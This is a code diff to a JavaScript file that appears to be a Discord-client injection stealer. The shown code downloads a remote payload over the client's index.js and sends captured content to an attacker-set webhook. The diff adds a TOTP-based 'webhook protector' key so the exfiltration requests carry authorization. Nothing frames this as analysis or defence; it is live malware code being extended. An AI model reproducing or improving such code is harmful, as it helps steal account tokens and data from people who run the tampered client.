@@ -7,6 +7,7 @@ const { BrowserWindow, session } = require('electron');
 
 const config = {
   webhook: '%WEBHOOK%',
+  webhook_protector_key: '%WEBHOOK_KEY%',
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
@@ -443,6 +444,7 @@ async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
         res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -624,6 +626,10 @@ const hooker = async (content) => {
     'Content-Type': 'application/json',
     'Access-Control-Allow-Origin': '*',
   };
+  if (!config.webhook.includes('api/webhooks')) {
+    const key = totp(config.webhook_protector_key);
+    headers['Authorization'] = key;
+  }
   const options = {
     protocol: url.protocol,
     hostname: url.host,
